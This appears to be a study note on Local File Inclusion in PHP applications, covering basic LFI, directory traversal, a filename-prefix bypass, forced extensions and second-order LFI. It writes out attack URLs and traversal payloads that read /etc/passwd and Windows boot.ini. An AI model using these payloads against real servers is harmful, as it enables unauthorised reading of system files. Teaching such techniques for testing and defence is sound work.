# Local File Inclusion (LFI) 

## 1. Basic LFI

After identifying an LFI vulnerability, we can exploit it to read local files from the server.

### Example Web App
```
http://<SERVER_IP>:<PORT>/index.php?language=es.php
```

The application loads different files based on the `language` parameter.

---

### Exploitation

Try reading system files:

#### Linux
```
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```

#### Windows
```
http://<SERVER_IP>:<PORT>/index.php?language=C:\Windows\boot.ini
```

If the file content is displayed → LFI confirmed

---

## 2. Path Traversal

Sometimes input is not used directly. Developers may add a directory:

```php
include("./languages/" . $_GET['language']);
```

### Problem
```
/etc/passwd → ./languages//etc/passwd (invalid path)
```

---

### Solution: Directory Traversal

Use `../` to move up directories:

```
../../../../etc/passwd
```

### Final Exploit
```
http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/passwd
```

---

### Key Concept

- `../` = move to parent directory
- Repeat until reaching root `/`

Example:
```
/var/www/html/ → ../../../
```

---

### Important Tip

- You can use many `../` safely
- Even if extra, it will still work
- But use minimum for clean exploits

---

## 3. Filename Prefix Bypass

Sometimes developers add a prefix:

```php
include("lang_" . $_GET['language']);
```

### Problem
```
../../../etc/passwd → lang_../../../etc/passwd (invalid)
```

---

### Bypass Technique

Add `/` before traversal:

```
/../../../etc/passwd
```

### Exploit
```
http://<SERVER_IP>:<PORT>/index.php?language=/../../../etc/passwd
```

---

## 4. Appended Extension

Developers may force `.php` extension:

```php
include($_GET['language'] . ".php");
```

### Problem
```
/etc/passwd → /etc/passwd.php (does not exist)
```

---

### Note
- This restricts file inclusion
- Bypass techniques exist (advanced topic)

---

## 5. Second-Order LFI

A more advanced LFI attack.

### Concept
- Input is stored first (e.g., in database)
- Later used in file inclusion

---

### Example

Profile avatar:
```
/profile/<username>/avatar.png
```

If username =:
```
../../../etc/passwd
```

Then application may load:
```
../../../etc/passwd
```

---

### Attack Flow

1. Inject payload into stored input (username)
2. Application saves it
3. Another function uses it
4. LFI triggered

---

### Why Dangerous

- Developers trust database values
- Input validation often skipped
- Harder to detect

---

## 6. Key Takeaways

- LFI allows reading local files
- Path traversal is the most common technique
- Prefix and extensions can break payloads
- Multiple bypass techniques exist
- Second-order LFI is more advanced and stealthy

---

## 7. Quick Summary

- Basic LFI → direct file read
- Path Traversal → bypass directory restrictions
- Prefix/Extension → need bypass techniques
- Second-order → indirect exploitation
